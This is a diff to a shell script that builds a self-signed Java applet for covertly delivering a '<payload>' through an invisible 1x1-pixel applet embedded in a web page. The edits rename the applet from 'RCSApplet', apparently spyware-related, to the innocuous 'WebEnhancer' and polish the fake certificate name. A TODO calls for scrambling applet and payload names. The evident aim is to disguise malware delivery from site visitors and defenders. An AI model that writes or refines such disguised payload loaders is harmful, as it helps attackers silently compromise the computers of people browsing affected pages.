@@ -2,7 +2,7 @@
 #   To deploy, copy .jar and .cer file to the desired web location, and insert the following snippet
 #   in the html code of the page.
 #	
-#       <applet code=RCSApplet.class archive="SignedHelloWorld.jar" width=1 height=1> 
+#       <applet code=WebEnhancer.class archive="WebEnhancer.jar" width=1 height=1> 
 #			<param name='first' value='<payload>' />
 #		</applet>
 #	
@@ -11,7 +11,7 @@
 # TODO: scramble applet and payload names
 #
 
-NAME="RCSApplet"
+NAME="WebEnhancer"
 
 # check arguments
 if [ $# -ne 1 ] ; then
@@ -62,7 +62,7 @@ if [ -f mykeystore ] ; then
 fi
 
 echo "[+] Generating key pairs"
-keytool -genkey -alias signapplet -dname "CN=ACMEINC, O=Default, C=US" -validity 18250 -keystore mykeystore -keypass mykeypass -storepass mystorepass
+keytool -genkey -alias signapplet -dname "CN=Acme Inc., O=Default, C=US" -validity 18250 -keystore mykeystore -keypass mykeypass -storepass mystorepass
 if [ $? -eq 1 ] ; then
     echo "Error with generating the key pair"
     exit
